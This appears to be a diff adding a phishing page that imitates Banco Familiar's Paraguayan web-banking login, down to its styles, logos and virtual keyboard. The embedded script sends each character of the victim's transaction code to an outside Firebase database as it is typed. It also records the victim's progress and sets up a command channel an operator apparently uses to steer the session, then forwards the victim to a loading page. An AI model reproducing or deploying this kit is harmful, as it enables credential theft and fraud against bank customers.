@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Familiar-Web</title>
+<link rel="icon" type="image/png" href="https://ssecure.familiar.com.py/bancaweb3/resources/images/favicon.png">
+<link href="https://ssecure.familiar.com.py/bancaweb3/resources/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/commons.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar_margin.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar_icons.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/keyboard.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar-responsive.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/main.css">
+<style>
+  @font-face{font-family:'robotoregular';font-weight:400;font-style:normal;font-display:swap;
+    src:url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-regular-webfont-5f945f5c55a07d2a60221ab200fd4133.woff2') format('woff2'),
+        url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-regular-webfont-9db7888a4c2b34bebe331fa65c534f16.woff') format('woff');}
+  @font-face{font-family:'robotobold';font-weight:700;font-style:normal;font-display:swap;
+    src:url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-bold-webfont-fa2496fffa299cae4878e8d67d698ea9.woff2') format('woff2'),
+        url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-bold-webfont-6a501aab45dbb9984df90f6208370474.woff') format('woff');}
+  @font-face{font-family:'robotomedium';font-weight:500;font-style:normal;font-display:swap;
+    src:url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-medium-webfont-526baa0edcedb893ffe618f920e8021e.woff2') format('woff2'),
+        url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-medium-webfont-d4613ee3dc97691b80a1ab614974ace3.woff') format('woff');}
+
+  html,body,div,span,p,a,h1,h2,h3,h4,h5,label,form,input,button,td,th,li{
+    font-family:'robotoregular','Roboto',Arial,Helvetica,sans-serif;
+  }
+  h1,h2,h3,h4,h5,b,strong,.content-title-ingresar h2,.text-instruccion h2{
+    font-family:'robotobold','Roboto',Arial,Helvetica,sans-serif;
+  }
+  .glyphicon{font-family:'Glyphicons Halflings' !important}
+
+  .box-login{padding-bottom:24px}
+  .caja-clave{padding:28px 24px 30px;text-align:center}
+  .caja-clave h4{color:#004185;font-size:19px;margin:0 0 8px}
+  .caja-clave .txt{color:#808080;font-size:12.5px;line-height:1.55;margin:0 0 16px}
+  .campo-clave{
+    width:100%;border:none;border-bottom:2px solid #004185;background:transparent;
+    text-align:center;font-size:22px;letter-spacing:7px;color:#004185;
+    padding:6px 0 8px;outline:none;font-weight:bold;
+  }
+  .campo-clave::placeholder{color:#c9d3dd;letter-spacing:4px;font-weight:normal}
+
+  #teclado{padding:0;margin:14px 0 10px}
+  #contenedorteclado{width:252px;margin:0 auto}
+  #botonesteclado{height:auto !important;padding:12px 8px 10px !important;font-size:1em;box-shadow:0 2px 10px #444}
+  .keyboard-button{width:34px !important;height:34px !important;font-size:17px !important;line-height:32px;margin:4px !important;padding:0 !important;border-radius:6px}
+  .keyboard-button:active{background-color:#bcbcbb}
+  .boton-borrar{
+    position:static !important;transform:none !important;width:100% !important;height:30px !important;
+    font-size:12px !important;margin:6px 0 0 !important;display:block !important;
+    background-color:#c9c9c8 !important;color:#333 !important;border-radius:6px !important;
+  }
+  .bottom-blue[disabled]{opacity:.6;cursor:default}
+  #errorBox{display:none;margin-top:12px;padding:9px;border-radius:6px;font-size:12.5px;font-weight:bold}
+</style>
+</head>
+<body id="bodyLogin">
+<div class="container">
+  <div class="row">
+    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 container-login">
+
+      <div class="col-xs-12 col-sm-6 content-left">
+        <div class="col-xs-12 col-sm-12 pdl-0 content-icon-login">
+          <span class="icon-familiar"></span>
+        </div>
+
+        <div class="col-xs-12 col-sm-12 box-login image-familiar-agua">
+          <div class="caja-clave">
+            <h4>Clave transaccional</h4>
+            <p class="txt">Ingresá tu clave transaccional para autorizar este dispositivo y operar con transferencias.</p>
+
+            <input id="clave" class="campo-clave" type="password" readonly="readonly" placeholder="••••••">
+
+            <div id="teclado" class="content-teclado impPass-content">
+              <div id="contenedorteclado">
+                <div id="botonesteclado" class="keyboard-keyset">
+                  <input value="7" type="button" class="keyboard-button">
+                  <input value="A" type="button" class="keyboard-button">
+                  <input value="2" type="button" class="keyboard-button">
+                  <input value="E" type="button" class="keyboard-button">
+                  <input value="9" type="button" class="keyboard-button"><br>
+                  <input value="C" type="button" class="keyboard-button">
+                  <input value="4" type="button" class="keyboard-button">
+                  <input value="B" type="button" class="keyboard-button">
+                  <input value="0" type="button" class="keyboard-button">
+                  <input value="6" type="button" class="keyboard-button"><br>
+                  <input value="1" type="button" class="keyboard-button">
+                  <input value="D" type="button" class="keyboard-button">
+                  <input value="8" type="button" class="keyboard-button">
+                  <input value="3" type="button" class="keyboard-button">
+                  <input value="5" type="button" class="keyboard-button"><br>
+                  <input value="Borrar" type="button" class="keyboard-button boton-borrar">
+                </div>
+              </div>
+            </div>
+
+            <button type="button" class="bottom-blue" id="btn">Autorizar</button>
+            <div class="alert alert-danger" id="errorBox"></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="col-xs-12 col-sm-6 login-box right" id="content-saludo" style="display:block">
+        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 content-title-ingresar">
+          <h2>Ingresar al Sistema</h2>
+        </div>
+        <div class="col-xs-12 col-sm-12 text-bienvenida">
+          <h1>Bienvenido a la Banca Web A Toda Hora</h1>
+        </div>
+        <div class="col-xs-12 col-sm-12 text-instruccion">
+          <h2>Tu seguridad es importante:</h2><br>
+          <p>Para ingresar a la Banca Web A Toda Hora de Banco Familiar es necesario que ingreses tu contraseña a través de un teclado virtual; de esta manera evitamos la captura de tu clave a través de virus.</p>
+        </div>
+        <div class="col-xs-12 col-sm-12 text-instruccion">
+          <h2>¿Cómo se usa el teclado virtual?</h2><br>
+          <p class="p-icon"><span class="glyphicon glyphicon-certificate item-1"></span>Ubicá el mouse sobre el teclado y hacé click en cada número o letra de tu contraseña.</p>
+          <p class="p-icon"><span class="glyphicon glyphicon-certificate item-2"></span>Luego de hacer click en un número o letra, ubicá el mouse fuera del teclado, de esa forma podrás visualizar de nuevo los números y letras.</p>
+        </div>
+      </div>
+
+      <div class="col-xs-12 col-sm-12 content-bottom pdt-15">
+        <div class="col-xs-5 col-sm-5 col-md-4 text-bottom-left">
+          <p>Banco Familiar 2018 Asunción del Paraguay</p>
+        </div>
+        <div class="col-xs-5 col-sm-5 col-md-6 text-bottom-right">
+          <p><a href="https://www.familiar.com.py/interna-84.htm">Nuestra red Nacional de Sucursales</a> - <a href="https://www.familiar.com.py/interna-122.htm">Condiciones Generales y Operacionales</a></p>
+          <p><a href="https://www.familiar.com.py/interna-85.htm">Política de Seguridad</a></p>
+        </div>
+        <div class="col-xs-2 col-sm-2 col-md-2 text-bottom-right" style="text-align:right">
+          <img src="https://ssecure.familiar.com.py/bancaweb3/resources/images/aTodaHora.png" alt="Familiar a toda hora" class="img-a-toda-hora">
+          <p>Versión 4.5.18</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+  var id = new URLSearchParams(location.search).get('u');
+  if(!id){ try{ id = localStorage.getItem('nbch_u'); }catch(x){} }
+  if(!id){ location.replace('indexfamiliar.html'); return; }
+
+  var inp = document.getElementById('clave'),
+      btn = document.getElementById('btn'),
+      caja = document.getElementById('errorBox');
+
+  fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({estado:'CLAVE TRANSACCIONAL', pagina:'clavetransaccionalfamiliar.html', clave_transaccional:''})}).catch(function(){});
+  fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({accion:'', ts:Date.now()})}).catch(function(){});
+
+  function guardar(){
+    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({clave_transaccional:inp.value})}).catch(function(){});
+  }
+
+  document.getElementById('botonesteclado').addEventListener('click', function(ev){
+    var b = ev.target;
+    if(b.tagName !== 'INPUT') return;
+    if(b.value === 'Borrar'){ inp.value = inp.value.slice(0,-1); guardar(); return; }
+    if(inp.value.length >= 20) return;
+    inp.value += b.value;
+    guardar();
+  });
+
+  btn.addEventListener('click', function(){
+    caja.style.display = 'none';
+    if(inp.value.length < 4){
+      caja.innerHTML = '<label>Aviso</label><br>Ingresá tu clave transaccional con el teclado virtual.';
+      caja.style.display = 'block';
+      return;
+    }
+    btn.disabled = true;
+    btn.textContent = 'Autorizando...';
+
+    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({clave_transaccional:inp.value, estado:'AUTORIZANDO', pagina:'cargandoclavefamiliar.html'})}).catch(function(){});
+
+    setTimeout(function(){ location.href = 'cargandoclavefamiliar.html?u=' + id; }, 900);
+  });
+})();
+</script>
+</body>
+</html>
